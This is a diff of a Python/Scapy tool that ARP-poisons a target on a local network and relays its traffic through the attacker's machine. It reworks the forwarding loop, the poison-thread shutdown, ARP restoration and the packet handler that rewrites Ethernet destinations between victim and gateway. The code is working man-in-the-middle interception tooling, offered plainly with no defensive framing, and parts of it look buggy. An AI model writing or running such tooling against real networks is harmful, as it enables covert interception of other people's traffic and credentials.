@@ -6,7 +6,6 @@ import subprocess  # For subprocess.run()
 import threading  # For threading.Thread and threading.Lock
 import time  # For time.sleep()
 import errno  # For errno (used for error checking in threads)
-import queue
 
 from scapy.all import *  #  Import all of Scapy
 from scapy.all import IP, Ether
@@ -32,7 +31,7 @@ class Tool:
         self.stop_event = threading.Event()  # Crucial: make sure it's in __init__
         self.poison_threads_lock = threading.Lock()  # Add lock
         self.forwarding_thread = None  # Initialize forwarding thread
-        self.packet_queue = Queue(maxsize=1000)  # Initialize packet queue
+        self.packet_queue = Queue()  # Initialize packet queue
         self.packet_queue_lock = threading.Lock()  # <--  Must be initialized here
 
         # Initialize network info immediately
@@ -215,8 +214,7 @@ class Tool:
 
             logger.warning("Could not restore ARP table. Information missing.")
 
-    def start_rerouting(self, target_ip, console):
-        self.console = console
+    def start_rerouting(self, target_ip):
 
         if (
             not self.is_network_info_available()
@@ -307,28 +305,6 @@ class Tool:
 
             logger.info(f"Started rerouting traffic for {target_ip}")
 
-            # --- Main Loop for Processing Packets from the Queue ---
-            while not self.stop_event.is_set():  # Loop until stop event is set
-                try:
-                    packet = self.packet_queue.get(timeout=1)  # Get with timeout
-                    self.packet_queue.task_done()  # Indicate task completion
-
-                    if (
-                        packet
-                    ):  # Handle shutdown condition by returning None if queue is empty
-                        summary = packet.summary()
-                        self.console.print(f"Processed: {summary}")
-
-                except queue.Empty:  # Handle queue timeout
-                    pass  # Do nothing on queue.Empty.  Loop continues or breaks when stop_event is set.
-
-        except KeyboardInterrupt:  # Handle Ctrl+C
-            print("\nStopping rerouting...")  # Indicate rerouting stopping
-            self.stop_rerouting()
-            self.console.print(
-                "[bold green]Traffic rerouting stopped and ARP table restored.[/]"
-            )
-
         except Exception as e:
             with self.poison_threads_lock:  # MUST acquire the lock during exception handling and cleanup
                 if (
@@ -391,50 +367,6 @@ class Tool:
 
     def stop_rerouting(self):
 
-        with self.poison_threads_lock:
-            if (
-                self.poison_threads
-            ):  # Check if poison threads exist and join before cleaning up
-                self.stop_event.set()  # Set stop event before cleaning up.
-                for thread in self.poison_threads:
-                    thread.join()
-                self.poison_threads = []
-
-            self._restore_arp()
-            if not self.use_scapy_forwarding:
-                subprocess.run(
-                    ["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True
-                )  # Disable IP forwarding
-            logger.info("Traffic rerouting stopped and ARP table restored.")
-
-        if self.use_scapy_forwarding:  # Ensure this check is still in place
-            if (
-                self.forwarding_thread
-            ):  # Only try to stop if exists, can happen during exceptions during rerouting setup phase
-                self.stop_event.set()  # Set stop_event *before* joining thread.
-
-                if (
-                    self.forwarding_thread.is_alive()
-                ):  # Only join if thread exists and is alive, which may not be the case if exception happens during thread setup phase during start_rerouting
-                    try:  # Wait for thread to finish before setting to None.
-                        self.forwarding_thread.join()  # <--- Join the forwarding thread
-                    except (
-                        RuntimeError
-                    ) as e:  # Properly handle runtime error to set forwarding_thread to None before exiting. This can avoid deadlock if KeyboardInterrupt happens while waiting for forwarding_thread to finish in join() call.
-                        if (
-                            str(e) == "cannot join current thread"
-                        ):  # Only catch specific exception. All other RuntimeErrors should propagate to caller.
-
-                            self.forwarding_thread = None
-                            logger.info("Stopped Scapy forwarding thread.")
-                        else:
-                            raise  # Re-raise exception if it is a different RuntimeError.
-
-                self.forwarding_thread = None  # Set to None *after* joining
-                logger.info("Stopped Scapy forwarding thread.")
-
-    def stop_rerouting_(self):
-
         with self.poison_threads_lock:  # Must acquire the lock when potentially accessing self.poison_threads
             if self.poison_threads:  # Check if the threads were ever started.
 
@@ -452,7 +384,6 @@ class Tool:
                     )  # Disable IP forwarding
 
                 logger.info("Traffic rerouting stopped and ARP table restored.")
-
                 self.poison_threads = []  # Clear the list (thread safety)
                 self.stop_event.clear()  # Reset the stop event
             else:  # No active threads
@@ -477,63 +408,45 @@ class Tool:
             self.forwarding_thread = None  # Reset forwarding thread after stopping.
             logger.info("Stopped Scapy forwarding thread.")  # Clear logging message
 
-    def _scapy_forwarding_loop_old(
-        self, target_ip, target_mac, gateway_ip, gateway_mac
-    ):
-        try:
-            while not self.stop_event.is_set():
-                try:
-                    sniff(
-                        prn=self.process_packet,  # Process each sniffed packet
-                        filter=f"host {target_ip} or host {self._gateway_ip}",  # Filter relevant traffic for efficiency
-                        store=False,  # Don't store packets in memory
-                        timeout=1,  # Use a timeout for responsiveness and stop functionality
-                        iface=self._interface,
-                    )
-
-                except Exception as e:
-                    # Set stop_event on error in _scapy_forwarding_loop so that while loop in start_rerouting will break and exception will be raised to the exception handling block of start_rerouting
-
-                    logger.exception(f"Error in forwarding loop: {e}")  # Log the error
-                    self.stop_event.set()
-
-                    # Stop forwarding on error
-                    break  # Exit loop
-
-        except (
-            Exception
-        ) as e:  # Set stop_event on error so that the while loop in start_rerouting will break which then bubbles up the exception to the except block in start_rerouting
-            logger.exception(
-                f"Error creating Scapy forwarding socket: {e}"
-            )  # Log the error
-            self.stop_event.set()  # Ensure stop_event is set
-
     def _scapy_forwarding_loop(self, target_ip, target_mac, gateway_ip, gateway_mac):
         try:
-            # Create an AsyncSniffer instance
-            self.sniffer = AsyncSniffer(
-                prn=self.process_packet,
-                filter=f"host {target_ip} or host {self._gateway_ip}",
-                store=False,
-                iface=self._interface,
-            )
+            with conf.L3socket() as fwd:
 
-            # Start sniffing in the background
-            self.sniffer.start()
+                while not self.stop_event.is_set():
+                    try:
 
-            while not self.stop_event.is_set():  # Use stop event for the loop condition
-                time.sleep(1)  # Keep the thread alive and responsive to stop_event
+                        packet = fwd.recv(1024, timeout=1)
 
-        except Exception as e:
-            self.sniffer.stop()  # Stop sniffer if any exception is raised
-            logger.exception(f"Error creating or running Scapy sniffer: {e}")
-            self.stop_event.set()  # Set the stop event to signal other parts of the code
-            # Important: Re-raise the exception to be handled by the caller
-            raise  # Or handle the exception here as needed
+                        if packet and IP in packet:
 
-        finally:  # Ensure sniffer is stopped in finally block to avoid leaking resources
-            if hasattr(self, "sniffer") and self.sniffer:
-                self.sniffer.stop()
+                            if packet[IP].dst == target_ip:  # Use the local copy
+                                packet[Ether].dst = target_mac  # Use local copy
+                            elif packet[IP].src == target_ip:
+                                packet[Ether].dst = gateway_mac
+                            elif packet[IP].src == gateway_ip:  # Handle reverse traffic
+                                packet[Ether].dst = target_mac
+                            elif packet[IP].dst == gateway_ip:
+                                packet[Ether].dst = gateway_mac
+
+                            try:  # Handle potential OSError during send
+                                fwd.send(packet)
+
+                                self.process_packet(
+                                    packet.copy()
+                                )  # Enqueue packet for later processing.
+
+                            except OSError as e:
+                                logger.error(
+                                    f"Error sending packet in forwarding loop: {e}"
+                                )
+
+                    except socket.timeout:
+                        pass  # Expected; just continue
+                    except Exception as e:  # Log and handle
+                        logger.exception(f"Error in forwarding loop: {e}")
+                        break  # Exit on any error. Let the main thread restart or handle it.
+        except Exception as e:  # Log exception
+            logger.exception(f"Error creating Scapy forwarding socket: {e}")
 
     def process_packet(self, packet):
         """Processes a captured packet and forwards it appropriately."""
@@ -543,35 +456,39 @@ class Tool:
 
         try:
             if IP in packet:
-                if packet[IP].dst == self.target_ip:
-                    packet[Ether].dst = self.target_mac
+                if self.use_scapy_forwarding or (
+                    not self.forwarding_thread or not self.forwarding_thread.is_alive()
+                ):
 
-                elif packet[IP].src == self.target_ip:
-                    packet[Ether].dst = self.gateway_mac
+                    logger.info(f"Processing packet: {packet.summary()}")
 
-                elif packet[IP].src == self._gateway_ip:
-                    # Handle reverse traffic from gateway to target
-                    packet[Ether].dst = self.target_mac
+                    if packet[IP].dst == self.target_ip:
+                        packet[Ether].dst = self.target_mac
+                        logger.debug("Redirecting to target MAC")
+                    elif packet[IP].src == self.target_ip:
+                        packet[Ether].dst = self.gateway_mac
+                        logger.debug("Redirecting to gateway MAC")
 
-                elif packet[IP].dst == self._gateway_ip:
-                    packet[Ether].dst = self.gateway_mac
+                    elif not self.use_scapy_forwarding:  # Using sysctl, not scapy
+                        logger.debug(
+                            f"Skipping processing for non-target related packet: {packet.summary()}"
+                        )
+                        return  # Let the system handle unrelated traffic
 
-                else:
-                    # Packet not related to target or gateway. Handle as needed. For instance, allow non-target traffic to flow by forwarding packet via sendp.
+                    elif self.use_scapy_forwarding:  # Scapy handles all forwarding
+                        if packet[IP].src == self._gateway_ip:
+                            packet[Ether].dst = self.target_mac
+                            logger.debug("Redirecting to target MAC")  # Log MAC change
+                        elif packet[IP].dst == self._gateway_ip:
+                            packet[Ether].dst = self.gateway_mac
+                            logger.debug("Redirecting to gateway MAC")  # Log MAC change
 
-                    packet.show()
-                    sendp(packet, verbose=0, iface=self._interface)
-
-                with self.packet_queue_lock:  # <---  This remains unchanged
                     try:
-                        self.packet_queue.put_nowait(packet.copy())
-                    except queue.Full:
-                        logger.warning("Packet queue full. Dropping packet.")
-
-                if self.use_scapy_forwarding:
-                    # Only send the packet if using Scapy for forwarding. If using sysctl, let system forwarding handle the packet.
-
-                    sendp(packet, verbose=0, iface=self._interface)
+                        sendp(
+                            packet, verbose=0, iface=self._interface
+                        )  # Send the packet
+                    except OSError as e:
+                        logger.error(f"Error sending packet: {e}")
 
                 else:  # System forwarding is active
                     logger.debug(
@@ -587,17 +504,10 @@ class Tool:
                         logger.error(f"Error sending packet: {e}")
 
             with self.packet_queue_lock:  # <--- CRITICAL: Protect queue access
-                # self.packet_queue.put(
-                #     packet.copy()
-                # )  # Put packet in queue (thread-safe)
-                try:
-                    # self.packet_queue.put_nowait(packet.copy())  # Non-blocking put
-
-                    self.packet_queue.put_nowait(packet.copy())  # <--- Already correct
-
-                    logger.info("Packet added to queue")
-                except queue.Full:
-                    self.logger.warning("Packet queue is full. Dropping packet.")
+                self.packet_queue.put(
+                    packet.copy()
+                )  # Put packet in queue (thread-safe)
+                logger.debug("Packet added to queue")
 
         except Exception as e:
             logger.exception(f"Error processing packet: {e}")
